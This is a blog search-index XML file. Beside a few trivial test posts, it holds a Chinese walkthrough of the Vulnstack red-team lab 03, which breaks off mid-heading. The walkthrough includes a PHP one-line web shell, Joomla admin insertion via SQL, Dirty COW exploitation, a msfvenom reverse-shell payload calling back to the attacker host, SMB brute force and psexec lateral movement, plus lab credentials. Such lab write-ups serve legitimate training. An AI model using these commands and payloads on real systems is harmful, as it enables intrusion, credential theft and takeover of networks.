<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>测试22222222222</title>
      <link href="/2024/04/19/1/"/>
      <url>/2024/04/19/1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>文章迁移</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试2</title>
      <link href="/2024/04/11/test2/"/>
      <url>/2024/04/11/test2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你好你好你好 测试2<br>222222222222222222</p>]]></content>
      
      
      <categories>
          
          <category> 测试大神 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试1</title>
      <link href="/2024/04/11/tset1/"/>
      <url>/2024/04/11/tset1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你好你好你好 测试1</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/04/11/hello-world/"/>
      <url>/2024/04/11/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ATK—CK红队评估实战靶场三</title>
      <link href="/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA03/"/>
      <url>/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA03/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="红日靶场03"><a href="#红日靶场03" class="headerlink" title="红日靶场03"></a>红日靶场03</h1><h2 id="一，环境搭建"><a href="#一，环境搭建" class="headerlink" title="一，环境搭建"></a>一，环境搭建</h2><ul><li>红日靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></li><li>本次靶场渗透主要是Joomla CMS漏洞的综合渗透练习，通过信息收集、漏洞利用、权限提升、以及域渗透。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">黑盒测试--</span><br><span class="line">出网IP 192.168.93.0/24</span><br><span class="line">出网主机为centos nat网卡+VMnat2网卡</span><br><span class="line">centos靶机开启后：</span><br><span class="line">设置为nat模式并且重启网卡</span><br><span class="line">service network restart</span><br><span class="line"></span><br><span class="line">IP详情：</span><br><span class="line">kali+CS+MSF</span><br><span class="line">192.168.43.33</span><br><span class="line">web-centos</span><br><span class="line">192.168.93.100</span><br><span class="line">192.168.43.118</span><br><span class="line">web1-ubuntu</span><br><span class="line">192.168.93.120</span><br><span class="line">PC-win7</span><br><span class="line">192.168.93.30</span><br><span class="line">win 2k8</span><br><span class="line">192.168.93.20</span><br><span class="line">win 2012</span><br><span class="line">192.168.93.10</span><br></pre></td></tr></table></figure><h3 id="靶场拓补图如下："><a href="#靶场拓补图如下：" class="headerlink" title="靶场拓补图如下："></a>靶场拓补图如下：</h3><p>​<img src="/assets/%E4%B8%89%E6%8B%93%E8%A1%A5%E5%9B%BE-20231130165403-chckaoz.png" alt="三拓补图">​</p><h2 id="二，外网渗透"><a href="#二，外网渗透" class="headerlink" title="二，外网渗透"></a>二，外网渗透</h2><p><strong>信息收集</strong></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -T4 192.168.43.0/24</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0-20231130142027-ijk4j7v.png" alt="主机发现">​</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -T4 -sS -sV -v 192.168.43.21</span><br><span class="line">nmap -A -p- -min-rate 8888 192.168.43.21</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Nmap-20231130144415-77rojuq.png" alt="Nmap">​</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.21:80</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-20231130144440-zacuglh.png" alt="目录爆破">​</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://192.168.43.21</span><br><span class="line">#CMS：joomla</span><br></pre></td></tr></table></figure><p>‍</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.9.12</span><br><span class="line">searchsploit -m 43488.txt</span><br><span class="line">cat 43488.txt</span><br><span class="line">#CVE-2018-5263  --&gt;XSS</span><br><span class="line">#shellcode并没有，百度一波，也无复现博客，换个姿势继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CVE-2018-5263-20231130144559-0vylk88.png" alt="CVE-2018-5263">​</p><h3 id="web界面"><a href="#web界面" class="headerlink" title="web界面"></a>web界面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">###web界面###</span><br><span class="line">访问80端口---&gt;类似一个博客网站</span><br><span class="line">#由于CMS框架是Joomla,直接使用joomscan</span><br></pre></td></tr></table></figure><p>​​</p><h3 id="Joomscan"><a href="#Joomscan" class="headerlink" title="Joomscan"></a>Joomscan</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.43.21/</span><br><span class="line">版本：Joomla 3.9.12</span><br></pre></td></tr></table></figure><p>​<img src="/assets/joomscan-20231130144939-7i96lgs.png" alt="joomscan">​</p><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#访问Joomscan敏感目录，得到数据库账密</span><br><span class="line">public $user = &#x27;testuser&#x27;; </span><br><span class="line">public $password = &#x27;cvcvgjASD!@&#x27;;</span><br><span class="line">#直接使用navicat连接数据库</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%AF%86-20231130145041-znwegi7.png" alt="敏感目录发现数据库账密">​</p><p>​<img src="/assets/navicat-20231130145102-srv6qe6.png" alt="navicat">​</p><p>‍</p><h3 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a>数据库信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#转了一圈，就发现几个有用的表</span><br><span class="line">#用户admin的密码，做了加盐处理。解密失败</span><br><span class="line">#换个姿势继续，尝试添加管理员账密</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%95%B0%E6%8D%AE%E5%BA%93user%E8%A1%A8-20231130145128-5io0pcd.png" alt="数据库user表">​</p><p>​<img src="/assets/joomla%E5%BA%93%E8%B4%A6%E5%AF%86-20231130145211-jpbq7ut.png" alt="joomla库账密">​</p><h3 id="添加管理员账密"><a href="#添加管理员账密" class="headerlink" title="添加管理员账密"></a>添加管理员账密</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#添加账密admin2:secret</span><br><span class="line">#执行SQL语句</span><br><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;,</span><br><span class="line">    &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br><span class="line">#可以看出，账户admin2添加成功</span><br></pre></td></tr></table></figure><p>根据官方提示步骤，添加管理员账密</p><p><img src="/assets/%E5%AE%98%E6%96%B9%E6%8F%90%E7%A4%BA-20231130145438-al8vee3.png" alt="官方提示"></p><p><img src="/assets/%E6%B7%BB%E5%8A%A0%E8%B4%A6%E5%AF%86joomla-20231130145259-sdyoin0.png" alt="添加账密joomla">​</p><h3 id="登录joomscan后台"><a href="#登录joomscan后台" class="headerlink" title="登录joomscan后台"></a>登录joomscan后台</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#192.168.93.21/administrator/index.php</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0-20231130145424-lmftsrk.png" alt="成功登陆后台">​​</p><h3 id="上传小马"><a href="#上传小马" class="headerlink" title="上传小马"></a>上传小马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接写个一句话木马，为后渗透做准备</span><br><span class="line"><span class="meta">&lt;?php eval(@$_POST[&#x27;a&#x27;]);phpinfo(); ?&gt;</span></span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC-20231130145603-il5nt5x.png" alt="写入木马">​</p><h3 id="蚁剑连接小马"><a href="#蚁剑连接小马" class="headerlink" title="蚁剑连接小马"></a>蚁剑连接小马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL：http://192.168.93.21/templates/beez3/web.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F-20231130145612-ui4in4e.png" alt="蚁剑连接成功">​</p><h3 id="蚁剑插件绕过命令执行"><a href="#蚁剑插件绕过命令执行" class="headerlink" title="蚁剑插件绕过命令执行"></a>蚁剑插件绕过命令执行</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#由于蚁剑终端命令执行做了限制</span><br><span class="line">#利用蚁剑插件进行绕过 --绕过disable_fuctions</span><br><span class="line">#蚁剑连接新生成的木马URL</span><br><span class="line">URL:http://192.168.43.21/templates/beez3/.antproxy.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E7%BB%88%E7%AB%AF%E6%8F%90%E7%A4%BAret127-20231130145702-c08egwa.png" alt="蚁剑终端提示ret=127">​</p><p>​<img src="/assets/%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6-20231130145857-qsmtqie.png" alt="蚁剑插件">​</p><p>​<img src="/assets/%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231130145940-fdf22yz.png" alt="插件绕过命令执行">​</p><p>​<img src="/assets/%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87%E6%88%90%E5%8A%9F-20231130150012-jebtim9.png" alt="插件绕过成功">​</p><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#并无可用提权姿势，换个方式继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/suid%E6%8F%90%E6%9D%83-20231130150042-c6i95tt.png" alt="suid提权">​</p><h3 id="利用蚁剑信息收集"><a href="#利用蚁剑信息收集" class="headerlink" title="利用蚁剑信息收集"></a>利用蚁剑信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp/mysql/tset.txt</span><br><span class="line">#应该是ssh账密</span><br><span class="line">adduser wwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure><p>​<img src="/assets/tmp%E4%B8%8B%E5%AD%98%E5%9C%A8tset%E6%96%87%E4%BB%B6-20231130150106-6u0ou7b.png" alt="tmp下存在tset文件">​</p><h3 id="xshell连接wwwuser"><a href="#xshell连接wwwuser" class="headerlink" title="xshell连接wwwuser"></a>xshell连接wwwuser</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#继续传马</span><br><span class="line">#显然运行失败</span><br><span class="line">#/tmp下存在passwd.bak文件</span><br><span class="line">利用无果</span><br></pre></td></tr></table></figure><p>​<img src="/assets/xshell%E8%BF%9E%E6%8E%A5-20231130150418-lalbpq3.png" alt="xshell连接">​</p><p>​<img src="/assets/psswdba%E6%96%87%E4%BB%B6-20231130150448-gb26zc4.png" alt="psswdba文件">​</p><h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用脏牛之前先查看Linux内核版本信息：</span><br><span class="line">unmae -a</span><br><span class="line">#版本号较低</span><br><span class="line">#2.6.32-431------inux ubuntu 4.4.0-142-generic</span><br><span class="line">#版本号大于2.6.32</span><br></pre></td></tr></table></figure><h3 id="EXP利用-CVE-2016-5195"><a href="#EXP利用-CVE-2016-5195" class="headerlink" title="EXP利用-CVE-2016-5195"></a>EXP利用-CVE-2016-5195</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line">#这个EXP在靶机上跑不起来，需要sudo进行编译</span><br><span class="line">#在kali本机编译后再上传，脚本是跑不起来的</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E4%B8%8A%E4%BC%A0%E8%84%8F%E7%89%9B%E5%88%B0%E9%9D%B6%E6%9C%BA-20231130150515-jvo9aiy.png" alt="上传脏牛到靶机">​</p><p>​<img src="/assets/kali%E7%BC%96%E8%AF%91%E5%AE%8C%E5%90%8E%E4%B8%8A%E4%BC%A0%E9%9D%B6%E6%9C%BA-20231130151036-oko9e5m.png" alt="kali编译完后上传靶机">​</p><p>​![屏幕截图 2023-11-28 111430](assets&#x2F;屏幕截图 2023-11-28 111430-20231130151052-9jcm8jb.png)​</p><h3 id="EXP利用-dirtycow"><a href="#EXP利用-dirtycow" class="headerlink" title="EXP利用-dirtycow"></a>EXP利用-dirtycow</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#换个EXP，继续打</span><br><span class="line">git clone https://github.com/FireFart/dirtycow</span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty 123456</span><br><span class="line">rm /tmp/passwd.bak</span><br><span class="line">./dirty 123456</span><br><span class="line">#虽然运行莫名终止，但最终可以提权</span><br><span class="line">su firefart</span><br><span class="line">id</span><br></pre></td></tr></table></figure><p>​<img src="/assets/gcc-20231130151145-mn3bk7v.png" alt="gcc">​</p><p>​![su 脏牛](assets&#x2F;su 脏牛-20231130151149-pde8wds.png)​</p><h3 id="Xshell连接firefart"><a href="#Xshell连接firefart" class="headerlink" title="Xshell连接firefart"></a>Xshell连接firefart</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#为了方便后续操作，直接新建会话</span><br><span class="line">firefart:123456</span><br></pre></td></tr></table></figure><p>​<img src="/assets/xft%E6%96%B0%E5%BB%BAroot%E7%94%A8%E6%88%B7-20231130151312-8hsxdoy.png" alt="xft新建root用户">​</p><h3 id="MSF上线"><a href="#MSF上线" class="headerlink" title="MSF上线"></a>MSF上线</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#由于这台机器是Linux，生成elf大马</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.43.33 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt; shell.elf</span><br><span class="line">#开启监听</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.43.33</span><br><span class="line">set lport 6666</span><br><span class="line">run</span><br><span class="line">#利用xftp上传大马到靶机</span><br><span class="line">#赋予大马权限</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">#运行</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure><p>​<img src="/assets/msf%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8-20231130151524-6cmpczq.png" alt="msf生成后门">​</p><p>​<img src="/assets/%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC-20231130151549-8x7vsyi.png" alt="运行木马"></p><p>​​<img src="/assets/%E6%9C%A8%E9%A9%AC%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BFMSF-20231130151557-6pp9rhw.png" alt="木马监听上线MSF">​</p><p><strong>至此，拿下了外网这台机器</strong></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查看路由</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加路由</span><br><span class="line">run autoroute -s 192.168.93.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">#挂起</span><br><span class="line">background</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/MSF%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1-20231130151904-e506ahy.png" alt="MSF添加路由">​​</p><h3 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 4a</span><br><span class="line">set SRVHOST 0.0.0.0  </span><br><span class="line">set SRVPORT 1888</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">vim /etc/proxychain4.conf</span><br><span class="line">socks4 0.0.0.0 1888</span><br></pre></td></tr></table></figure><p>​<img src="/assets/socks4a-20231130152029-q5u0atb.png" alt="socks4a">​</p><h3 id="内网主机扫描"><a href="#内网主机扫描" class="headerlink" title="内网主机扫描"></a>内网主机扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#扫描内网主机存活：</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.93.0-255</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br><span class="line">#扫到了三台机器</span><br><span class="line">192.168.93.30/24 win7</span><br><span class="line">192.168.93.20/24 win2008</span><br><span class="line">192.168.93.10/24 win-8GA56TNV3MV</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97-20231130152159-mtudj1h.png" alt="主机扫描模块">​<img src="/assets/%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F-20231130152202-zeo3nof.png" alt="内网主机扫描">​​</p><h3 id="nmap探测三台主机端口"><a href="#nmap探测三台主机端口" class="headerlink" title="nmap探测三台主机端口"></a>nmap探测三台主机端口</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychain nmap -F -sT -v 192.168.93.10</span><br><span class="line">proxychain nmap -F -sT -v 192.168.93.20</span><br><span class="line">proxychain nmap -F -sT -v 192.168.93.30</span><br><span class="line">#10开启389端口 --&gt;可能是域控</span><br><span class="line">#都开启了445端口，尝试爆破管理员账密</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F10%E7%AB%AF%E5%8F%A3-20231130152524-sl9gjgx.png" alt="挂代理扫描10端口">​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F20%E7%AB%AF%E5%8F%A3-20231130152529-ukvxwhi.png" alt="挂代理扫描20端口">​<img src="/assets/%E6%8C%82%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F30%E7%AB%AF%E5%8F%A3-20231130152532-auqekmr.png" alt="挂代理扫描30端口">​​​</p><h3 id="尝试爆破三台主机管理员账密"><a href="#尝试爆破三台主机管理员账密" class="headerlink" title="尝试爆破三台主机管理员账密"></a>尝试爆破三台主机管理员账密</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#字典需要足够大</span><br><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set SMBuser Administrator</span><br><span class="line">set PASS_FILE /home/kali/Desktop/top999.txt</span><br><span class="line">run</span><br><span class="line">--&gt;192.168.93.20 smb  123qwe!ASD</span><br><span class="line">--&gt;192.168.93.30 smb  123qwe!ASD</span><br><span class="line">#已经拿到了两台win的密码，</span><br><span class="line">#10这台机器出不了，可能就是域控</span><br></pre></td></tr></table></figure><p>​<img src="/assets/SMB-20%E5%87%BA%E4%BA%86-20231130160123-9rrsciy.png" alt="SMB-20出了">​<img src="/assets/SMB-30%E5%87%BA%E4%BA%86-20231130160126-v0ftudn.png" alt="SMB-30出了">​​</p><h2 id="四，横向渗透"><a href="#四，横向渗透" class="headerlink" title="四，横向渗透"></a>四，横向渗透</h2><h3 id="psexec攻击"><a href="#psexec攻击" class="headerlink" title="psexec攻击"></a>psexec攻击</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#利用psexec工具进行攻击192.168.93.30/20主机</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass 123qwe!ASD</span><br><span class="line">set RHOSTS 192.168.93.30</span><br><span class="line">run</span><br><span class="line">---&gt;20/30机器攻击成功</span><br></pre></td></tr></table></figure><p>攻击20这台机器</p><p><img src="/assets/%E4%B9%9F%E6%8B%BF%E4%B8%8Bwin2k8--20-20231130160231-c0kdpmm.png" alt="也拿下win2k8--20">​</p><p>攻击30这台机器</p><p><img src="/assets/psexec%E6%94%BB%E5%87%BB%E6%8B%BF%E4%B8%8Bwin7--30-20231130160234-7h204tf.png" alt="psexec攻击拿下win7--30">​​</p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br><span class="line">#域控明显是10这台机器，和之前猜测的一样</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7-20231130160334-crjeci8.png" alt="定位域控">​</p><h3 id="minikatz"><a href="#minikatz" 